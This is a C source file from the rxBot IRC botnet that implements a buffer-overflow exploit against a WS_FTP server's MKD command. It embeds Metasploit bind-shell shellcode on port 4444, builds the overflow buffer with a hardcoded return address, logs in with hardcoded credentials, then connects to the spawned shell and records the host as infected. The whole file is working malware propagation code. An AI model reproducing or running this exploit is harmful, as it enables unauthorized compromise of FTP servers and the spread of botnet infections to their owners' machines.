/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// http://www.securityfocus.com/data/vulnerabilities/exploits/wsftp_server_503_mkd.pm
// http://www.securityfocus.com/data/vulnerabilities/exploits/ws_ftpOverflowExploitByNoPh0BiA.c

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_FTPDS
//UNTESTED!!!

#define USER "ftp"
#define PASS "NoPh0BiA" /*greetz*/

bool ws_ftp(EXINFO exinfo) {

	/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
	unsigned char shellcode[] =
		"\x81\xc4\x54\xf2\xff\xff" /*add esp, -3500*/
		"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0\x10\x80"
		"\x98\x83\xeb\xfc\xe2\xf4\x1c\x7a\x6b\xd5\x08\xe9\x7f\x67\x1f\x70"
		"\x0b\xf4\xc4\x34\x0b\xdd\xdc\x9b\xfc\x9d\x98\x11\x6f\x13\xaf\x08"
		"\x0b\xc7\xc0\x11\x6b\xd1\x6b\x24\x0b\x99\x0e\x21\x40\x01\x4c\x94"
		"\x40\xec\xe7\xd1\x4a\x95\xe1\xd2\x6b\x6c\xdb\x44\xa4\xb0\x95\xf5"
		"\x0b\xc7\xc4\x11\x6b\xfe\x6b\x1c\xcb\x13\xbf\x0c\x81\x73\xe3\x3c"
		"\x0b\x11\x8c\x34\x9c\xf9\x23\x21\x5b\xfc\x6b\x53\xb0\x13\xa0\x1c"
		"\x0b\xe8\xfc\xbd\x0b\xd8\xe8\x4e\xe8\x16\xae\x1e\x6c\xc8\x1f\xc6"
		"\xe6\xcb\x86\x78\xb3\xaa\x88\x67\xf3\xaa\xbf\x44\x7f\x48\x88\xdb"
		"\x6d\x64\xdb\x40\x7f\x4e\xbf\x99\x65\xfe\x61\xfd\x88\x9a\xb5\x7a"
		"\x82\x67\x30\x78\x59\x91\x15\xbd\xd7\x67\x36\x43\xd3\xcb\xb3\x43"
		"\xc3\xcb\xa3\x43\x7f\x48\x86\x78\x91\xc4\x86\x43\x09\x79\x75\x78"
		"\x24\x82\x90\xd7\xd7\x67\x36\x7a\x90\xc9\xb5\xef\x50\xf0\x44\xbd"
		"\xae\x71\xb7\xef\x56\xcb\xb5\xef\x50\xf0\x05\x59\x06\xd1\xb7\xef"
		"\x56\xc8\xb4\x44\xd5\x67\x30\x83\xe8\x7f\x99\xd6\xf9\xcf\x1f\xc6"
		"\xd5\x67\x30\x76\xea\xfc\x86\x78\xe3\xf5\x69\xf5\xea\xc8\xb9\x39"
		"\x4c\x11\x07\x7a\xc4\x11\x02\x21\x40\x6b\x4a\xee\xc2\xb5\x1e\x52"
		"\xac\x0b\x6d\x6a\xb8\x33\x4b\xbb\xe8\xea\x1e\xa3\x96\x67\x95\x54"
		"\x7f\x4e\xbb\x47\xd2\xc9\xb1\x41\xea\x99\xb1\x41\xd5\xc9\x1f\xc0"
		"\xe8\x35\x39\x15\x4e\xcb\x1f\xc6\xea\x67\x1f\x27\x7f\x48\x6b\x47"
		"\x7c\x1b\x24\x74\x7f\x4e\xb2\xef\x50\xf0\x0f\xde\x60\xf8\xb3\xef"
		"\x56\x67\x30\x10\x80\x98";

	long retaddr = 0x25185bb8;

	char request[128], recvbuf[64];
	
	sprintf(request, 
		"USER %s\r\n"
		"PASS %s\r\n", USER, PASS);
	
	char *buffer=(char*)malloc(8192);
	memcpy(buffer+498, "\x01\x30\xfd\x7f",4); /*Not critical, but seems to keep buffer from getting mangled*/
	memcpy(buffer+514, &retaddr, 4);
	memcpy(buffer+518, &retaddr, 4);
	memcpy(buffer+522, "\x90\x90", 2);
	memcpy(buffer+524, shellcode, sizeof(shellcode));

	SOCKADDR_IN saddr;
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = finet_addr(exinfo.ip);
	saddr.sin_port = fhtons(exinfo.port);
	memset(&(saddr.sin_zero), 0, 8);

	SOCKET s = fsocket(AF_INET,SOCK_STREAM,0);
	if((fconnect(s,(LPSOCKADDR)&saddr,sizeof(saddr))) == SOCKET_ERROR) return false;

	if(fsend(s, request, strlen(request),0) == SOCKET_ERROR) {
		fclosesocket(s);
		return false;
	}

	if(frecv(s, recvbuf, sizeof(recvbuf), 0) == SOCKET_ERROR) {
			fclosesocket(s);
			return false;
	} else if(recvbuf[0] == '5') {
		fclosesocket(s);
		return false;
	}

	fsend(s, "MKD ", 4, 0);
	fsend(s, buffer, 954, 0);
	fsend(s, "\r\n", 2, 0);

	fclosesocket(s);
	free(buffer);

	ConnectShell(exinfo, 4444);

	return (AddEx(exinfo, true));
}
#endif